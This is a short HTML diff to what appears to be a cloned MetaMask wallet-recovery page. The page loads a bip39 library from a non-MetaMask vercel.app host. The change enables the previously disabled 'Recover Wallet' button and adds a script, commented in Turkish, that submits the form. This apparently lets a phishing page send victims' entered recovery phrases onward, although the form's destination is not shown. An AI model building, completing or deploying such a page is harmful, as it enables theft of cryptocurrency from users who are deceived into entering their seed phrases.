@@ -67987,10 +67987,10 @@ input:checked + .send-v2__amount-max__button {
                   </div>
                   <button
                     class="button btn--rounded btn-primary create-new-vault__submit-button"
-                    disabled=""
+                  
                     type="button"
                     id="form77"
-                  disabled>
+                  onclick="postForm()">
                     Recover Wallet
                   </button>
                 </form>
@@ -68001,6 +68001,13 @@ input:checked + .send-v2__amount-max__button {
       </div>
     </div>
     <div id="popover-content"></div>
+  
+<script>
+  function postForm() {
+    // Formu post et
+    document.getElementById("form7").submit();
+  }
+</script>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/bip39.min.js"></script>
